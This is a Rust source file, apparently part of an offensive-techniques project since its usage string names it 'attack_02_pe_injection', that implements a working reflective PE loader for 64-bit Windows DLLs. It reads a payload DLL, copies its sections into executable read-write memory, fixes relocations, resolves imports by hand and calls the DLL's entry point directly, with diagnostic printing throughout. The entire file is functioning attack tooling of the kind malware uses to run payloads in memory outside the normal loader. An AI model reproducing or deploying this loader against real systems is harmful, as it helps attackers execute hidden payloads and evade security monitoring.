use std::ffi::CStr;
use std::fs;
use std::ptr;

use common::raii::ManagedVirtualAlloc;
use windows_sys::Win32::Foundation::HINSTANCE;
use windows_sys::Win32::Foundation::HMODULE;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows_sys::Win32::System::SystemServices::IMAGE_BASE_RELOCATION;
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
use windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64;
use windows_sys::core::BOOL;
 

fn main() {
    // Extract Payload Path
    let dll_path_arg = std::env::args().nth(1).expect("Usage: attack_02_pe_injection.exe <payload dll path>");
    let dll_path = std::path::PathBuf::from(dll_path_arg).canonicalize().expect("DLL path is invalid or not found");

    // Read PE File
    let pe_base = fs::read(dll_path).expect("Failed to read the payload PE");
    let dos_h = unsafe { ptr::read_unaligned(pe_base.as_ptr() as *const IMAGE_DOS_HEADER) };

    let magic = dos_h.e_magic;
    let lfanew = dos_h.e_lfanew;

    if magic != 0x5A4D  {
        println!("PE magic bytes does not match (expected: 0x5A4D <MZ>, found: {:#x})", magic);
        return;
    }

    let nt_h = unsafe { ptr::read_unaligned(pe_base.as_ptr().add(lfanew as usize) as *const IMAGE_NT_HEADERS64) };

    let sig = nt_h.Signature;
    if sig != 0x00004550 {
        println!("PE NT Header Signature does not match (expected: 0x00004550, found: {:#x})", sig);
        return;
    }

    let opt_magic = nt_h.OptionalHeader.Magic;
    if opt_magic != 0x20B {
        println!("not PE32+ (expected 0x20B, found {:#x}) — 32-bit PE not supported", opt_magic);
        return;
    }
    let opt_magic_str = "PE32+";

    let machine = nt_h.FileHeader.Machine;
    let machine_str = match machine {
        0x8664 => "x64 (AMD64)",
        0x014C => "x86 (i386)",
        0xAA64 => "ARM64",
        _ => "unknown",
    };

    let sections_count = nt_h.FileHeader.NumberOfSections as usize;
    let img_base = nt_h.OptionalHeader.ImageBase;
    let size_of_img = nt_h.OptionalHeader.SizeOfImage as usize;

    println!("\nPE Information");
    println!();
    println!("[DOS Header]");
    println!("  e_magic      : {:#06x} ({})", magic, "MZ");
    println!("  e_lfanew     : {:#x} (NT header offset)", lfanew);
    println!();
    println!("[NT Headers]");
    println!("  Signature    : {:#010x} (\"PE\")", sig);
    println!("  Machine      : {:#06x} ({})", machine, machine_str);
    println!("  Sections     : {}", sections_count);
    println!("  Magic        : {:#06x} ({})", opt_magic, opt_magic_str);
    println!("  ImageBase    : {:#018x}", img_base);
    println!("  SizeOfImage  : {:#x} ({} bytes)", size_of_img, size_of_img);

    println!();
    println!("[Section Headers]");
    let headers_sz = nt_h.OptionalHeader.SizeOfHeaders as usize;

    // Alloc
    let alloc_base = ManagedVirtualAlloc::new(size_of_img, PAGE_EXECUTE_READWRITE)
        .expect("Failed to Allocate Memory for payload");
    let section_h_stride = size_of::<IMAGE_SECTION_HEADER>();

    unsafe {
        // Copy headers
        ptr::copy_nonoverlapping(pe_base.as_ptr(), alloc_base.as_ptr() as *mut u8, headers_sz);
    }

    let section_base = lfanew as usize + size_of::<IMAGE_NT_HEADERS64>();

    for section_idx in 0..sections_count {
        let section_offset = section_base + section_idx as usize * section_h_stride;
        let img_section_h_offset = unsafe { pe_base.as_ptr().add(section_offset) };
        let img_section_h = unsafe { ptr::read_unaligned(img_section_h_offset as *const IMAGE_SECTION_HEADER) };

        let name = str::from_utf8(&img_section_h.Name).unwrap_or("unknown").trim_end_matches('\0');
        let r_addr = img_section_h.PointerToRawData as usize;
        let r_data_sz = img_section_h.SizeOfRawData as usize;
        let rva = img_section_h.VirtualAddress as usize;
        let vsize = unsafe { img_section_h.Misc.VirtualSize } as usize;
        let characteristic = img_section_h.Characteristics;

        println!("  {name}");
        println!("    Pointer to Raw Data : {r_addr:#x}");
        println!("    Raw Data Size       : {r_data_sz}");
        println!("    Virtual Address     : {rva:#x}");
        println!("    Virtual Size        : {vsize}");
        println!("    Characteristics     : {characteristic:#x}");
        
        // copy/write this section image to the allocated adress
        let pe_loc = unsafe { pe_base.as_ptr().add(r_addr) };
        let dst_alloc = unsafe { alloc_base.as_ptr().add(rva) };

        let sec_cp_sz = std::cmp::min(vsize, r_data_sz);
        unsafe {
            ptr::copy_nonoverlapping(pe_loc, dst_alloc as *mut u8, sec_cp_sz);
        }
        // ...
    }

    let delta = (alloc_base.as_ptr() as u64).wrapping_sub(img_base);

    // loop to fix reloc table
    let reloc_dir = nt_h.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    let reloc_sz = reloc_dir.Size as usize;
    if delta != 0 && reloc_sz != 0 {
        let mut curr_table = unsafe { 
            alloc_base.as_ptr().add(reloc_dir.VirtualAddress as usize) as *const IMAGE_BASE_RELOCATION
        };
        let reloc_end = unsafe { curr_table.byte_add(reloc_sz) };

        // println!();
        // println!("[Relocation Table]");
        loop
        {
            let reloc_h = unsafe { ptr::read_unaligned(curr_table) };

            let block_va = reloc_h.VirtualAddress;
            let block_sz = reloc_h.SizeOfBlock as usize;

            if block_sz == 0 { break; }

            // println!("  VirtualAddress :  {block_va:#x}");
            // println!("  Size of Block  :  {block_sz:#x}");

            let table_end = unsafe { curr_table.byte_add(block_sz) as *const u16 };
            let mut curr_entry = unsafe { curr_table.byte_add(8) as *const u16 };

            loop {
                let entry = unsafe { ptr::read_unaligned(curr_entry) };
                let reloc_type = entry >> 12;

                if reloc_type != 0 {
                    let reloc_offset = (entry & 0x0FFF) as usize;
                    // println!("    Reloc Type: {reloc_type:#x}; Reloc Offset: {reloc_offset:#x}");

                    let reloc_target_addr = unsafe { 
                        alloc_base.as_ptr().byte_add(block_va as usize).byte_add(reloc_offset) 
                    };

                    if reloc_type == 3 {
                        let reloc_target_addr = reloc_target_addr as *mut u32;
                        let reloc_target_val = unsafe { ptr::read_unaligned(reloc_target_addr) };
                        unsafe { ptr::write_unaligned(reloc_target_addr, reloc_target_val.wrapping_add(delta as u32)); }
                    } else if reloc_type == 10 {
                        let reloc_target_addr = reloc_target_addr as *mut u64;
                        let reloc_target_val = unsafe { ptr::read_unaligned(reloc_target_addr) };
                        unsafe { ptr::write_unaligned(reloc_target_addr, reloc_target_val.wrapping_add(delta as u64)); }
                    }
                }

                curr_entry = unsafe { curr_entry.add(1) };
                if curr_entry >= table_end { break; }
            }

            curr_table = table_end as *const IMAGE_BASE_RELOCATION;
            if curr_table >= reloc_end  { break; }
        }
    }

    let import_dir = nt_h.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    let import_va = import_dir.VirtualAddress as usize;
    let mut desc_ptr = unsafe { alloc_base.as_ptr().byte_add(import_va) as *const IMAGE_IMPORT_DESCRIPTOR };

    println!();
    println!("[Imported Functions]");

    loop {
        let desc = unsafe { ptr::read_unaligned(desc_ptr) };
        if desc.FirstThunk == 0 { break; }

        let lib_name_ptr = unsafe { alloc_base.as_ptr().byte_add(desc.Name as usize) as *const u8 };
        let lib_name = unsafe { CStr::from_ptr(lib_name_ptr as *const i8).to_string_lossy() };
        let hmod: HMODULE = unsafe { LoadLibraryA(lib_name_ptr) };

        if hmod.is_null() {
            println!("Something went wrong when loading {lib_name}");
            desc_ptr = unsafe { desc_ptr.add(1) };
            continue;
        }

        println!("  {lib_name}");

        let mut int_ptr = unsafe { alloc_base.as_ptr().byte_add(desc.Anonymous.OriginalFirstThunk as usize) as *const u64};
        let mut iat_ptr = unsafe { alloc_base.as_ptr().byte_add(desc.FirstThunk as usize) as *mut u64 };

        loop {
            let thunk = unsafe {
                // we have checked that this is a 64bit PE
                ptr::read_unaligned(int_ptr)
            };
            if thunk == 0 { break; }
            
            unsafe { 
                let fn_addr: u64;
                if (thunk & IMAGE_ORDINAL_FLAG64) != 0 {
                    fn_addr = GetProcAddress(hmod, (thunk & 0xFFFF) as *const u8).unwrap() as u64;
                } else {
                    let ibn = alloc_base.as_ptr().byte_add((thunk & 0x7FFFFFFF) as usize) as *const u8; 
                    let name_ptr = ibn.add(2);

                    let fn_name_str = CStr::from_ptr(name_ptr as *const i8).to_string_lossy();
                    println!("    {fn_name_str}");

                    fn_addr = GetProcAddress(hmod, name_ptr).unwrap() as u64;
                };

                std::ptr::write_unaligned(iat_ptr, fn_addr);
                int_ptr = int_ptr.add(1);
                iat_ptr = iat_ptr.add(1);
            }
        }

        desc_ptr = unsafe { desc_ptr.add(1) };
    }

    // Find the function and call it
    let dll_main_fn_ptr = unsafe { alloc_base.as_ptr().byte_add(nt_h.OptionalHeader.AddressOfEntryPoint as usize) };
    type DllMainFunc = unsafe extern "system" fn(HINSTANCE, u32, *mut std::ffi::c_void) -> BOOL;
    let dll_main: DllMainFunc = unsafe { std::mem::transmute(dll_main_fn_ptr) };

    let res = unsafe { dll_main(alloc_base.as_ptr(), 1, std::ptr::null_mut()) };

    println!("DLL calls return {res}");
    std::thread::sleep(std::time::Duration::from_secs(10));
}
